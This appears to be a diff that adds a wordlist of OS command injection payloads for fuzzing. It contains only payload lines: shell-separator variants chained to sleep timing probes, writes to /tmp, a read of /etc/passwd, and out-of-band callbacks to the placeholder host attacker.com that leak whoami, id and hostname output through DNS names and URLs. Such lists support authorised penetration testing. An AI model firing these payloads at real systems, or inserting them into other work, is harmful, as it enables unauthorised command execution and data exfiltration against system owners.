@@ -1,0 +1,116 @@
+;sleep 5
+&&sleep 5
+|sleep 5
+$(sleep 5)
+`sleep 5`
+;nslookup attacker.com
+;ping attacker.com
+;curl http://attacker.com
+;wget http://attacker.com
+;nslookup `whoami`.attacker.com
+
+;sleep 5
+;sleep 10
+;sleep 15
+&&sleep 5
+&&sleep 10
+&&sleep 15
+|sleep 5
+|sleep 10
+|sleep 15
+$(sleep 5)
+$(sleep 10)
+$(sleep 15)
+`sleep 5`
+`sleep 10`
+`sleep 15`
+
+;ping -c 5 127.0.0.1
+&&ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+$(ping -c 5 127.0.0.1)
+
+;nslookup attacker.com
+&&nslookup attacker.com
+|nslookup attacker.com
+$(nslookup attacker.com)
+`nslookup attacker.com`
+
+;ping attacker.com
+&&ping attacker.com
+|ping attacker.com
+$(ping attacker.com)
+
+;curl http://attacker.com
+&&curl http://attacker.com
+|curl http://attacker.com
+$(curl http://attacker.com)
+
+;wget http://attacker.com
+&&wget http://attacker.com
+|wget http://attacker.com
+$(wget http://attacker.com)
+
+;curl attacker.com/`whoami`
+&&curl attacker.com/`whoami`
+|curl attacker.com/`whoami`
+
+;nslookup `whoami`.attacker.com
+&&nslookup `whoami`.attacker.com
+|nslookup `whoami`.attacker.com
+
+;ping `whoami`.attacker.com
+&&ping `whoami`.attacker.com
+|ping `whoami`.attacker.com
+
+;echo test > /tmp/pwned
+&&echo test > /tmp/pwned
+|echo test > /tmp/pwned
+
+;touch /tmp/pwned
+&&touch /tmp/pwned
+|touch /tmp/pwned
+
+;cat /etc/passwd > /tmp/output
+&&cat /etc/passwd > /tmp/output
+|cat /etc/passwd > /tmp/output
+
+;id > /tmp/id.txt
+&&id > /tmp/id.txt
+|id > /tmp/id.txt
+
+;whoami > /tmp/whoami.txt
+&&whoami > /tmp/whoami.txt
+|whoami > /tmp/whoami.txt
+
+;sleep 5;id
+;sleep 10;whoami
+;sleep 15;uname -a
+
+&&sleep 5&&id
+&&sleep 10&&whoami
+
+|sleep 5|id
+|sleep 10|whoami
+
+$(sleep 5;id)
+$(sleep 10;whoami)
+
+`ping -c 5 attacker.com`
+`nslookup attacker.com`
+`curl http://attacker.com`
+
+;dig attacker.com
+&&dig attacker.com
+|dig attacker.com
+
+;host attacker.com
+&&host attacker.com
+|host attacker.com
+
+;wget attacker.com/`hostname`
+&&wget attacker.com/`hostname`
+
+;curl attacker.com/`id`
+&&curl attacker.com/`id`
+|curl attacker.com/`id`
